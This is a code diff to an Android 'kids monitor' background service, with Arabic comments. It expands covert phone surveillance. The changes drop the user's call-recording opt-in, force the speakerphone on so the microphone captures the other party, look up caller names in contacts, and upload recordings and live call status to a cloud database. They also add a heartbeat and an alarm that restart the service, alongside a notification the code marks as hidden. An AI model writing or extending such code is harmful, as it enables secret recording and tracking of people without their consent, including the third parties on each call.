@@ -1,6 +1,7 @@
 package com.kids.monitor
 
 import android.Manifest
+import android.app.AlarmManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -10,6 +11,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import android.database.ContentObserver
+import android.media.AudioManager
 import android.media.MediaRecorder
 import android.net.ConnectivityManager
 import android.net.Network
@@ -18,6 +20,7 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.provider.CallLog
+import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Telephony
 import android.telephony.PhoneStateListener
@@ -52,6 +55,25 @@ class MonitorService : Service() {
     private var recordingFile: File? = null
     private var recordingNumber: String? = null
     private var recordingStartedAt = 0L
+    private var callStartedAt = 0L
+    private var callDirection = "incoming"
+    private var callRinging = false
+
+    /** نبضة كل 60 ثانية تُظهر للوحة أن الجهاز متصل فعلاً (لا بيانات قديمة). */
+    private val heartbeatTask = object : Runnable {
+        override fun run() {
+            FirestoreSync.setLive(
+                this@MonitorService, "status",
+                mapOf(
+                    "online" to DeviceInfo.online(this@MonitorService),
+                    "battery" to DeviceInfo.battery(this@MonitorService),
+                    "recording" to (recorder != null),
+                    "timestamp" to System.currentTimeMillis(),
+                ),
+            )
+            handler.postDelayed(this, HEARTBEAT_MS)
+        }
+    }
 
     private val syncTask = object : Runnable {
         override fun run() {
@@ -131,6 +153,9 @@ class MonitorService : Service() {
         startLocationUpdates()
         handler.removeCallbacks(locationWatchdog)
         handler.postDelayed(locationWatchdog, 60_000L)
+        handler.removeCallbacks(heartbeatTask)
+        handler.post(heartbeatTask)
+        scheduleAlarm()
 
         if (intent?.action == ACTION_SYNC) {
             syncStatus()
@@ -144,6 +169,7 @@ class MonitorService : Service() {
         handler.removeCallbacks(syncTask)
         handler.removeCallbacks(relayTask)
         handler.removeCallbacks(locationWatchdog)
+        handler.removeCallbacks(heartbeatTask)
         commandsListener?.remove()
         commandsListener = null
         LocationCollector.stopUpdates(this, locationToken)
@@ -400,9 +426,24 @@ class MonitorService : Service() {
             @Deprecated("Deprecated in Java")
             override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                 when (state) {
-                    TelephonyManager.CALL_STATE_RINGING -> recordingNumber = incomingNumber
-                    TelephonyManager.CALL_STATE_OFFHOOK -> startCallRecording()
-                    TelephonyManager.CALL_STATE_IDLE -> stopCallRecording()
+                    TelephonyManager.CALL_STATE_RINGING -> {
+                        callRinging = true
+                        if (!incomingNumber.isNullOrBlank()) recordingNumber = incomingNumber
+                        publishCall(active = true, incoming = true)
+                    }
+                    TelephonyManager.CALL_STATE_OFFHOOK -> {
+                        if (recordingNumber.isNullOrBlank()) recordingNumber = incomingNumber
+                        callStartedAt = System.currentTimeMillis()
+                        callDirection = if (callRinging) "incoming" else "outgoing"
+                        callRinging = false
+                        publishCall(active = true, incoming = callDirection == "incoming")
+                        startCallRecording()
+                    }
+                    TelephonyManager.CALL_STATE_IDLE -> {
+                        publishCall(active = false, incoming = callDirection == "incoming")
+                        stopCallRecording()
+                        callRinging = false
+                    }
                 }
             }
         }
@@ -413,14 +454,70 @@ class MonitorService : Service() {
         } catch (e: Exception) { /* تجاهل */ }
     }
 
+    /** يعلن بدء/انتهاء المكالمة في live/call حتى تُظهر اللوحة إشعاراً فورياً. */
+    private fun publishCall(active: Boolean, incoming: Boolean) {
+        val number = recordingNumber.orEmpty()
+        val now = System.currentTimeMillis()
+        val data = mutableMapOf<String, Any>(
+            "active" to active,
+            "number" to number,
+            "name" to "",
+            "direction" to if (incoming) "incoming" else "outgoing",
+            "startedAt" to if (active) (if (callStartedAt > 0L) callStartedAt else now) else callStartedAt,
+            "recording" to active,
+            "timestamp" to now,
+        )
+        if (!active) data["duration"] = ((now - callStartedAt) / 1000L).coerceAtLeast(0L)
+        FirestoreSync.setLive(this, "call", data)
+        if (number.isBlank()) return
+        Thread {
+            val name = lookupCallName(number)
+            if (name.isNotBlank()) {
+                FirestoreSync.setLive(
+                    this, "call",
+                    mapOf("active" to active, "number" to number, "name" to name, "timestamp" to System.currentTimeMillis()),
+                )
+            }
+        }.start()
+    }
+
+    /** بحث محلي في جهات الاتصال عن اسم الرقم (بديل بسيط لتروكولر، بدون إنترنت). */
+    private fun lookupCallName(number: String): String {
+        if (number.isBlank()) return ""
+        if (!Permissions.has(this, Manifest.permission.READ_CONTACTS)) return ""
+        return try {
+            val uri = android.net.Uri.withAppendedPath(
+                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
+                android.net.Uri.encode(number),
+            )
+            contentResolver.query(
+                uri,
+                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
+                null, null, null,
+            )?.use { c -> if (c.moveToFirst()) c.getString(0).orEmpty() else "" } ?: ""
+        } catch (e: Exception) {
+            ""
+        }
+    }
+
+    /** تشغيل السماعة أثناء التسجيل حتى يلتقط المايك صوت الطرف الآخر. */
+    @Suppress("DEPRECATION")
+    private fun setSpeaker(on: Boolean) {
+        try {
+            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
+            am.isSpeakerphoneOn = on
+        } catch (e: Exception) { /* تجاهل */ }
+    }
+
     private fun startCallRecording() {
-        if (!prefs().getBoolean(CALL_RECORDER, false)) return
         if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
         if (recorder != null) return
+        setSpeaker(true)
+        // المايك أولاً (يلتقط صوت السماعة) ثم VOICE_COMMUNICATION كبديل
         val sources = intArrayOf(
-            MediaRecorder.AudioSource.VOICE_CALL,
-            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
             MediaRecorder.AudioSource.MIC,
+            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+            MediaRecorder.AudioSource.VOICE_CALL,
         )
         for (source in sources) {
             try {
@@ -451,6 +548,7 @@ class MonitorService : Service() {
     }
 
     private fun stopCallRecording() {
+        setSpeaker(false)
         val mr = recorder ?: return
         try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
         try { mr.release() } catch (e: Exception) { /* تجاهل */ }
@@ -460,42 +558,86 @@ class MonitorService : Service() {
         val number = recordingNumber
         recordingNumber = null
         val startedAt = recordingStartedAt
+        recordingStartedAt = 0L
+        val direction = callDirection
         if (file == null) return
         if (!file.exists() || file.length() <= 1024) {
             file.delete()
-            FirestoreSync.appendItem(
-                this, "calls",
-                mapOf(
-                    "number" to (number ?: ""),
-                    "name" to "",
-                    "type" to "recorded",
-                    "duration" to 0,
-                    "timestamp" to startedAt,
-                    "recording" to "failed",
-                    "reason" to "الملف فارغ — النظام يمنع تسجيل المكالمات على أندرويد 10+",
-                ),
-            )
+            Thread {
+                FirestoreSync.appendItem(
+                    this, "calls",
+                    mapOf(
+                        "number" to (number ?: ""),
+                        "name" to lookupCallName(number.orEmpty()),
+                        "type" to "recorded",
+                        "direction" to direction,
+                        "duration" to 0,
+                        "timestamp" to startedAt,
+                        "recording" to "failed",
+                        "reason" to "الملف فارغ — النظام يمنع تسجيل المكالمات على أندرويد 10+",
+                    ),
+                )
+            }.start()
             return
         }
         Thread {
             val url = StorageUploader.uploadSync(file, "recordings/${file.name}")
-            val inline = if (url == null) StorageUploader.inlineData(file) else null
+            val inline = if (url == null) StorageUploader.inlineData(file, 700_000) else null
+            val saved = url != null || inline != null
+            val duration = ((System.currentTimeMillis() - startedAt) / 1000L).coerceAtLeast(0L).toInt()
+            val name = lookupCallName(number.orEmpty())
             FirestoreSync.appendItem(
-                this, "media",
+                this, "calls",
                 mapOf(
-                    "name" to "تسجيل مكالمة ${number ?: ""}".trim(),
+                    "number" to (number ?: ""),
+                    "name" to name,
+                    "type" to "recorded",
+                    "direction" to direction,
+                    "duration" to duration,
+                    "timestamp" to startedAt,
+                    "recording" to if (saved) "saved" else "failed",
                     "url" to (url ?: ""),
                     "dataUrl" to (inline ?: ""),
-                    "type" to "audio",
                     "mimeType" to "audio/mp4",
                     "size" to file.length(),
-                    "timestamp" to System.currentTimeMillis(),
-                    "recording" to if (url != null || inline != null) "saved" else "failed",
-                    "number" to (number ?: ""),
                 ),
             )
+            // نسخة في قسم الوسائط للتشغيل السريع (روابط Storage فقط لتوفير الحجم)
+            if (url != null) {
+                FirestoreSync.appendItem(
+                    this, "media",
+                    mapOf(
+                        "name" to "تسجيل مكالمة ${number ?: ""}".trim(),
+                        "url" to url,
+                        "type" to "audio",
+                        "mimeType" to "audio/mp4",
+                        "size" to file.length(),
+                        "timestamp" to System.currentTimeMillis(),
+                        "recording" to "saved",
+                        "number" to (number ?: ""),
+                    ),
+                )
+            }
             file.delete()
         }.start()
+    }
+
+    /** يعيد جدولة تشغيل الخدمة بعد 15 دقيقة لو أوقفها النظام (توفير الطاقة). */
+    private fun scheduleAlarm() {
+        try {
+            val am = getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
+            val pending = PendingIntent.getBroadcast(
+                this, 2003,
+                Intent(this, AlarmReceiver::class.java).setAction(AlarmReceiver.ACTION_WATCHDOG),
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
+            )
+            val at = System.currentTimeMillis() + 15 * 60 * 1000L
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, pending)
+            } else {
+                am.set(AlarmManager.RTC_WAKEUP, at, pending)
+            }
+        } catch (e: Exception) { /* تجاهل */ }
     }
 
     // ---------- الإشعار (مخفي) ----------
@@ -567,6 +709,7 @@ class MonitorService : Service() {
         private const val NOTIFICATION_ID = 1001
         private const val SYNC_INTERVAL_MS = 3 * 60 * 1000L
         private const val RELAY_INTERVAL_MS = 10 * 60 * 1000L
+        private const val HEARTBEAT_MS = 60 * 1000L
 
         @Volatile
         private var instance: MonitorService? = null
